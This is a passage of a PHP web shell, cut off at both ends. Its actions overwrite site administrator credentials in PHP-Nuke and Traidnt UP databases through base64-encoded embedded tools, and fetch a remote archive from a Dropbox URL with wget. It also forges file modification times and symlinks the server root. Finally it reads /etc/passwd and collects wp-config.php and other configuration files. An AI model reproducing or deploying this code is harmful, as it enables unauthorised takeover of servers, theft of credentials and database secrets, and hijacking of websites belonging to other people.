sgdmVyeSBtdWNoIDspJyk7PC9zY3JpcHQ+IjsKfQp9CgovL1BIUC1OVUtFCmlmIChpc3NldCgkX1BPU1RbJ3BocC1udWtlJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBQSFAtTlVLRSBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluLnBocDxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vY29uZmlnLnBocDwvZm9udD48L2NlbnRlcj4KICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHZhbHVlPWxvY2FsaG9zdCB0eXBlPXRleHQgbmFtZT1kYmhwbmsgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXBocG51a2UgdHlwZT10ZXh0IG5hbWU9ZGJucG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHVzZXI8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1yb290IHR5cGU9dGV4dCBuYW1lPWRidXBuayBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnBwbmsgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVycG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBwYXNzd29yZCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT1wYXNzd29yZCBuYW1lPXBzcG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW51a2VfIHR5cGU9dGV4dCBuYW1lPXBycG5rIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHBuayA9ICRfUE9TVFsnZGJocG5rJ107CiRkYm5wbmsgID0gJF9QT1NUWydkYm5wbmsnXTsKJGRidXBuayA9ICRfUE9TVFsnZGJ1cG5rJ107CiRkYnBwbmsgID0gJF9QT1NUWydkYnBwbmsnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHBuaywkZGJ1cG5rLCRkYnBwbmspOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5wbmspOwoKJHVycG5rPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnBuayk7CiRzZXRfdXJwbmsgPSAkX1BPU1RbJ3VycG5rJ107CgokcHNwbms9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHBzcG5rKTsKJHBhc3NfcG5rID0gJF9QT1NUWydwc3BuayddOwokc2V0X3BzcG5rID0gbWQ1KCRwYXNzX3Buayk7CgokcG5rX3ByZWZpeCA9ICRfUE9TVFsncHJwbmsnXTsKCiR0YWJsZV9uYW1lNiA9ICRwbmtfcHJlZml4LiJ1c2VycyIgOwokdGFibGVfbmFtZTcgPSAkcG5rX3ByZWZpeC4iYXV0aG9ycyIgOwoKJGxlY29uZ3RoaWVuMTUgPSAiVVBEQVRFICR0YWJsZV9uYW1lNiBTRVQgdXNlcm5hbWUgPSciLiRzZXRfdXJwbmsuIicgV0hFUkUgdXNlcl9pZCA9JzInIjsKJGxlY29uZ3RoaWVuMTYgPSAiVVBEQVRFICR0YWJsZV9uYW1lNiBTRVQgdXNlcl9wYXNzd29yZCA9JyIuJHNldF9wc3Buay4iJyBXSEVSRSB1c2VyX2lkID0nMiciOwoKJGxlY29uZ3RoaWVuMTcgPSAiVVBEQVRFICR0YWJsZV9uYW1lNyBTRVQgYWlkID0nIi4kc2V0X3VycG5rLiInIFdIRVJFIHJhZG1pbnN1cGVyID0nMSciOwokbGVjb25ndGhpZW4xOCA9ICJVUERBVEUgJHRhYmxlX25hbWU3IFNFVCBwd2QgPSciLiRzZXRfcHNwbmsuIicgV0hFUkUgcmFkbWluc3VwZXIgPScxJyI7Cgokb2s4PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xNSk7CiRvazg9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjE2KTsKJG9rOD1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMTcpOwokb2s4PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xOCk7CgppZigkb2s4KXsKZWNobyAiPHNjcmlwdD5hbGVydCgnUEhQLU5VS0UgdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9UcmFpZG50IFVQCmlmIChpc3NldCgkX1BPU1RbJ3VwJ10pKQp7CmVjaG8gIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0wIHdpZHRoPScxMDAlJz4KPHRyPjx0ZD4KPGNlbnRlcj48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkNoYW5nZSBUcmFpZG50IFVQIEluZm88YnI+UGF0Y2ggQ29udHJvbCBQYW5lbCA6IFtwYXRjaF0vdXBsb2FkY3A8YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2luY2x1ZGVzL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJodXAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXVwbG9hZCB0eXBlPXRleHQgbmFtZT1kYm51cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiB1c2VyPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cm9vdCB0eXBlPXRleHQgbmFtZT1kYnV1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EQiBwYXNzd29yZDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9cGFzc3dvcmQgbmFtZT1kYnB1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJ1cCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGFzc3dvcmQgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9cGFzc3dvcmQgbmFtZT1wc3VwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHVwID0gJF9QT1NUWydkYmh1cCddOwokZGJudXAgID0gJF9QT1NUWydkYm51cCddOwokZGJ1dXAgPSAkX1BPU1RbJ2RidXVwJ107CiRkYnB1cCAgPSAkX1BPU1RbJ2RicHVwJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh1cCwkZGJ1dXAsJGRicHVwKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJudXApOwoKJHVydXA9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVydXApOwokc2V0X3VydXAgPSAkX1BPU1RbJ3VydXAnXTsKCiRwc3VwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCRwc3VwKTsKJHBhc3NfdXAgPSAkX1BPU1RbJ3BzdXAnXTsKJHNldF9wc3VwID0gbWQ1KCRwYXNzX3VwKTsKCiRsZWNvbmd0aGllbjE5ID0gIlVQREFURSBhZG1pbiBTRVQgYWRtaW5fdXNlciA9JyIuJHNldF91cnVwLiInIFdIRVJFIGFkbWluX2lkID0nMSciOwokbGVjb25ndGhpZW4yMCA9ICJVUERBVEUgYWRtaW4gU0VUIGFkbWluX3Bhc3N3b3JkID0nIi4kc2V0X3BzdXAuIicgV0hFUkUgYWRtaW5faWQgPScxJyI7Cgokb2s5PUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4xOSk7CiRvazk9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjIwKTsKCmlmKCRvazkpewplY2hvICI8c2NyaXB0PmFsZXJ0KCdUcmFpZG50IFVQIHVwZGF0ZSBzdWNjZXNzIC4gVGhhbmsgS3ltTGpuayB2ZXJ5IG11Y2ggOyknKTs8L3NjcmlwdD4iOwp9Cn0KLy9FTkQKPz4K
';
    $file       = fopen("change-pas.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=change-pas.php width=100% height=720px frameborder=0></iframe> ";
} elseif ($action == 'reverseip') {
    @exec('wget http://dl.dropbox.com/u/74425391/ip.tar.gz');
    @exec('tar -xvf ip.tar.gz');
    echo "<iframe src=ip/index.php width=100% height=720px frameborder=0></iframe> ";
} elseif ($action == 'editfile') {
    if (file_exists($opfile)) {
        $fp       = @fopen($opfile, 'r');
        $contents = @fread($fp, filesize($opfile));
        @fclose($fp);
        $contents = htmlspecialchars($contents);
    }
    formhead(array(
        'title' => 'Create / Edit File'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Current File (import new file name and new file)',
        'name' => 'editfilename',
        'value' => $opfile,
        'newline' => 1
    ));
    maketext(array(
        'title' => 'File Content',
        'name' => 'filecontent',
        'value' => $contents
    ));
    formfooter();
} elseif ($action == 'newtime') {
    $opfilemtime = @filemtime($opfile);
    $cachemonth  = array(
        'January' => 1,
        'February' => 2,
        'March' => 3,
        'April' => 4,
        'May' => 5,
        'June' => 6,
        'July' => 7,
        'August' => 8,
        'September' => 9,
        'October' => 10,
        'November' => 11,
        'December' => 12
    );
    formhead(array(
        'title' => 'Clone file was last modified time'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Alter file',
        'name' => 'curfile',
        'value' => $opfile,
        'size' => 120,
        'newline' => 1
    ));
    makeinput(array(
        'title' => 'Reference file (fullpath)',
        'name' => 'tarfile',
        'size' => 120,
        'newline' => 1
    ));
    formfooter();
    formhead(array(
        'title' => 'Set last modified'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Current file (fullpath)',
        'name' => 'curfile',
        'value' => $opfile,
        'size' => 120,
        'newline' => 1
    ));
    p('<p>Instead &raquo;');
    p('year:');
    makeinput(array(
        'name' => 'year',
        'value' => date('Y', $opfilemtime),
        'size' => 4
    ));
    p('month:');
    makeinput(array(
        'name' => 'month',
        'value' => date('m', $opfilemtime),
        'size' => 2
    ));
    p('day:');
    makeinput(array(
        'name' => 'day',
        'value' => date('d', $opfilemtime),
        'size' => 2
    ));
    p('hour:');
    makeinput(array(
        'name' => 'hour',
        'value' => date('H', $opfilemtime),
        'size' => 2
    ));
    p('minute:');
    makeinput(array(
        'name' => 'minute',
        'value' => date('i', $opfilemtime),
        'size' => 2
    ));
    p('second:');
    makeinput(array(
        'name' => 'second',
        'value' => date('s', $opfilemtime),
        'size' => 2
    ));
    p('</p>');
    formfooter();
} elseif ($action == 'symroot') {
    $file       = fopen($dir . "symroot.php", "w+");
    $perltoolss = 'PD9waHAKCgogJGhlYWQgPSAnCjxodG1sPgo8aGVhZD4KPC9zY3JpcHQ+Cjx0aXRsZT4tLT09W1tTeW0gbGpuayBBTGwgQ29uRmlnICsgU3ltIFJvb3QgYnkgS3ltIExqbmtdXT09LS08L3RpdGxlPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+Cgo8U1RZTEU+CmJvZHkgewpmb250LWZhbWlseTogVGFob21hCn0KdHIgewpCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsKY29sb3I6ICNGRkY7Cn0KdGQgewpCT1JERVI6IGRhc2hlZCAxcHggIzMzMzsKY29sb3I6ICNGRkY7Cn0KLnRhYmxlMSB7CkJPUkRFUjogMHB4IEJsYWNrOwpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsKY29sb3I6ICNGRkY7Cn0KLnRkMSB7CkJPUkRFUjogMHB4OwpCT1JERVItQ09MT1I6ICMzMzMzMzM7CmZvbnQ6IDdwdCBWZXJkYW5hOwpjb2xvcjogR3JlZW47Cn0KLnRyMSB7CkJPUkRFUjogMHB4OwpCT1JERVItQ09MT1I6ICMzMzMzMzM7CmNvbG9yOiAjRkZGOwp9CnRhYmxlIHsKQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7CkJPUkRFUi1DT0xPUjogIzMzMzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmNvbG9yOiAjRkZGOwp9CmlucHV0IHsKYm9yZGVyCQkJOiBkYXNoZWQgMXB4Owpib3JkZXItY29sb3IJCTogIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDhwdCBWZXJkYW5hOwpjb2xvcjogUmVkOwp9CnNlbGVjdCB7CkJPUkRFUi1SSUdIVDogIEJsYWNrIDFweCBzb2xpZDsKQk9SREVSLVRPUDogICAgI0RGMDAwMCAxcHggc29saWQ7CkJPUkRFUi1MRUZUOiAgICNERjAwMDAgMXB4IHNvbGlkOwpCT1JERVItQk9UVE9NOiBCbGFjayAxcHggc29saWQ7CkJPUkRFUi1jb2xvcjogI0ZGRjsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDhwdCBWZXJkYW5hOwpjb2xvcjogUmVkOwp9CnN1Ym1pdCB7CkJPUkRFUjogIGJ1dHRvbmhpZ2hsaWdodCAycHggb3V0c2V0OwpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsKd2lkdGg6IDMwJTsKY29sb3I6ICNGRkY7Cn0KdGV4dGFyZWEgewpib3JkZXIJCQk6IGRhc2hlZCAxcHggIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IEZpeGVkc3lzIGJvbGQ7CmNvbG9yOiAjOTk5Owp9CkJPRFkgewoJU0NST0xMQkFSLUZBQ0UtQ09MT1I6IEJsYWNrOyBTQ1JPTExCQVItSElHSExJR0hULWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItU0hBRE9XLWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItM0RMSUdIVC1jb2xvcjogI0ZGRjsgU0NST0xMQkFSLUFSUk9XLUNPTE9SOiBCbGFjazsgU0NST0xMQkFSLVRSQUNLLWNvbG9yOiAjRkZGOyBTQ1JPTExCQVItREFSS1NIQURPVy1jb2xvcjogI0ZGRgptYXJnaW46IDFweDsKY29sb3I6IFJlZDsKYmFja2dyb3VuZC1jb2xvcjogQmxhY2s7Cn0KLm1haW4gewptYXJnaW4JCQk6IC0yODdweCAwcHggMHB4IC00OTBweDsKQk9SREVSOiBkYXNoZWQgMXB4ICMzMzM7CkJPUkRFUi1DT0xPUjogIzMzMzMzMzsKfQoudHQgewpiYWNrZ3JvdW5kLWNvbG9yOiBCbGFjazsKfQoKQTpsaW5rIHsKCUNPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTp2aXNpdGVkIHsKCUNPTE9SOiBXaGl0ZTsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTpob3ZlciB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQpBOmFjdGl2ZSB7Cgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUKfQo8L1NUWUxFPgo8c2NyaXB0IGxhbmd1YWdlPVwnamF2YXNjcmlwdFwnPgpmdW5jdGlvbiBoaWRlX2RpdihpZCkKewogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5zdHlsZS5kaXNwbGF5ID0gXCdub25lXCc7CiAgZG9jdW1lbnQuY29va2llPWlkK1wnPTA7XCc7Cn0KZnVuY3Rpb24gc2hvd19kaXYoaWQpCnsKICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCkuc3R5bGUuZGlzcGxheSA9IFwnYmxvY2tcJzsKICBkb2N1bWVudC5jb29raWU9aWQrXCc9MTtcJzsKfQpmdW5jdGlvbiBjaGFuZ2VfZGl2c3QoaWQpCnsKICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpLnN0eWxlLmRpc3BsYXkgPT0gXCdub25lXCcpCiAgICBzaG93X2RpdihpZCk7CiAgZWxzZQogICAgaGlkZV9kaXYoaWQpOwp9Cjwvc2NyaXB0Pic7ID8+CjxodG1sPgoJPGhlYWQ+CgkJPD9waHAgCgkJZWNobyAkaGVhZCA7CgkJZWNobyAnCgo8dGFibGUgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCIgY2xhc3M9InRiMSIgPgoKCQkJCgogICAgICAgPHRkIHdpZHRoPSIxMDAlIiBhbGlnbj1jZW50ZXIgdmFsaWduPSJ0b3AiIHJvd3NwYW49IjEiPgogICAgICAgICAgIDxmb250IGNvbG9yPXJlZCBzaXplPTUgZmFjZT0iY29taWMgc2FucyBtcyI+PGI+LS09PVtbIFN5bSBsam5rIEFMbCBDb25GaWc8L2ZvbnQ+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT01IGZhY2U9ImNvbWljIHNhbnMgbXMiPjxiPiAgICsgU3ltIFJvb3QgPC9mb250Pjxmb250IGNvbG9yPWdyZWVuIHNpemU9NSBmYWNlPSJjb21pYyBzYW5zIG1zIj48Yj4gVGVhbSBieSBLeW0gTGpuayBdXT09LS08L2ZvbnQ+IDxkaXYgY2xhc3M9ImhlZHIiPiAKCiAgICAgICAgPHRkIGhlaWdodD0iMTAiIGFsaWduPSJsZWZ0IiBjbGFzcz0idGQxIj48L3RkPjwvdHI+PHRyPjx0ZCAKICAgICAgICB3aWR0aD0iMTAwJSIgYWxpZ249ImNlbnRlciIgdmFsaWduPSJ0b3AiIHJvd3NwYW49IjEiPjxmb250IAogICAgICAgIGNvbG9yPSJyZWQiIGZhY2U9ImNvbWljIHNhbnMgbXMic2l6ZT0iMSI+PGI+IAogICAgICAgIAkJCQkJCiAgICAgICAgICAgPC90YWJsZT4KICAgICAgICAKCic7IAoKPz4KPGNlbnRlcj4KPGZvcm0gbWV0aG9kPXBvc3Q+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9ImNvbWljIHNhbnMgbXMiPjEuIENyZWF0IHBocC5pbmkgZmlsZTwvZm9udD48cD4KPGlucHV0IHR5cGU9c3VibWl0IG5hbWU9aW5pIHZhbHVlPSJ1c2UgdG8gR2VuZXJhdGUgUEhQLmluaSIgLz48L2Zvcm0+Cjxmb3JtIG1ldGhvZD1wb3N0Pjxmb250IGNvbG9yPXdoaXRlIHNpemU9MiBmYWNlPSJjb21pYyBzYW5zIG1zIj4yLiBHZXQgdXNlcm5hbWVzIGZvciBzeW1saW5rPC9mb250PjxwPgoJPGlucHV0IHR5cGU9c3VibWl0IG5hbWU9InVzcmUiIHZhbHVlPSJ1c2UgdG8gRXh0cmFjdCB1c2VybmFtZXMiIC8+PC9mb3JtPgoJCgk8P3BocAoJaWYoaXNzZXQoJF9QT1NUWydpbmknXSkpCgl7CgkJCgkJJHI9Zm9wZW4oJ3BocC5pbmknLCd3Jyk7CgkJJHJyPSIgZGlzYmFsZV9mdW5jdGlvbnM9bm9uZSAiOwoJCWZ3cml0ZSgkciwkcnIpOwoJCSRsaW5rPSI8YSBocmVmPXBocC5pbmk+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0yIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+PHU+b3BlbiBQSFAuSU5JPC91PjwvZm9udD48L2E+IjsKCQllY2hvICRsaW5rOwkKCQl9Cgk/PgoJPD9waHAKCWlmKGlzc2V0KCRfUE9TVFsndXNyZSddKSl7CgkJPz48Zm9ybSBtZXRob2Q9cG9zdD4KCTx0ZXh0YXJlYSByb3dzPTEwIGNvbHM9NTAgbmFtZT11c2VyPjw/cGhwICAkdXNlcnM9ZmlsZSgiL2V0Yy9wYXNzd2QiKTsKZm9yZWFjaCgkdXNlcnMgYXMgJHVzZXIpCnsKJHN0cj1leHBsb2RlKCI6IiwkdXNlcik7CmVjaG8gJHN0clswXS4iXG4iOwp9Cgo/PjwvdGV4dGFyZWE+PGJyPjxicj4KCTxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXN1IHZhbHVlPSJMZXRzIFN0YXJ0IiAvPjwvZm9ybT4KCTw/cGhwIH0gPz4KCTw/cGhwCgllcnJvcl9yZXBvcnRpbmcoMCk7CgllY2hvICI8Zm9udCBjb2xvcj1yZWQgc2l6ZT0yIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+IjsKCWlmKGlzc2V0KCRfUE9TVFsnc3UnXSkpCgl7Cglta2Rpcignc3ltJywwNzc3KTsKJHJyICA9ICIgT3B0aW9ucyBhbGwgXG4gRGlyZWN0b3J5SW5kZXggU3V4Lmh0bWwgXG4gQWRkVHlwZSB0ZXh0L3BsYWluIC5waHAgXG4gQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgXG4gIEFkZFR5cGUgdGV4dC9wbGFpbiAuaHRtbCBcbiBBZGRIYW5kbGVyIHR4dCAuaHRtbCBcbiBSZXF1aXJlIE5vbmUgXG4gU2F0aXNmeSBBbnkiOwokZyA9IGZvcGVuKCdzeW0vLmh0YWNjZXNzJywndycpOwpmd3JpdGUoJGcsJHJyKTsKJFN5bSA9IHN5bWxpbmsoIi8iLCJzeW0vcm9vdCIpOwoJCSAgICAkcnQ9IjxhIGhyZWY9c3ltL3Jvb3Q+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+IFN5bTwvZm9udD48L2E+IjsKICAgICAgICBlY2hvICJSb290IC8gZm9sZGVyIHN5bWxpbmsgPGJyPjx1PiRydDwvdT4iOwoJCQoJCSRkaXI9bWtkaXIoJ3N5bScsMDc3Nyk7CgkJJHIgID0gIiBPcHRpb25zIGFsbCBcbiBEaXJlY3RvcnlJbmRleCBTdXguaHRtbCBcbiBBZGRUeXBlIHRleHQvcGxhaW4gLnBocCBcbiBBZGRIYW5kbGVyIHNlcnZlci1wYXJzZWQgLnBocCBcbiAgQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sIFxuIEFkZEhhbmRsZXIgdHh0IC5odG1sIFxuIFJlcXVpcmUgTm9uZSBcbiBTYXRpc2Z5IEFueSI7CiAgICAgICAgJGYgPSBmb3Blbignc3ltLy5odGFjY2VzcycsJ3cnKTsKICAgCiAgICAgICAgZndyaXRlKCRmLCRyKTsKICAgICAgICAkY29uc3ltPSI8YSBocmVmPXN5bS8+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zIGZhY2U9XCJjb21pYyBzYW5zIG1zXCI+Y29uZmlndXJhdGlvbiBmaWxlczwvZm9udD48L2E+IjsKICAgICAgIAllY2hvICI8YnI+U3ltIExqbmsgQWxsIENvbkZpZyA8YnI+PHU+PGZvbnQgY29sb3I9cmVkIHNpemU9MiBmYWNlPVwiY29taWMgc2FucyBtc1wiPiRjb25zeW08L2ZvbnQ+PC91PiI7CiAgICAgICAJCiAgICAgICAJCSR1c3I9ZXhwbG9kZSgiXG4iLCRfUE9TVFsndXNlciddKTsKICAgICAgIAkkY29uZmlndXJhdGlvbj1hcnJheSgid3AtY29uZmlnLnBocCIsIndvcmRwcmVzcy93cC1jb25maWcucGhwIiwiY29uZmlndXJhdGlvbi5waHAiLCJibG9nL3dwLWNvbmZpZy5waHAiLCJqb29tbGEvY29uZmlndXJhdGlvbi5waHAiLCJ2Yi9pbmNs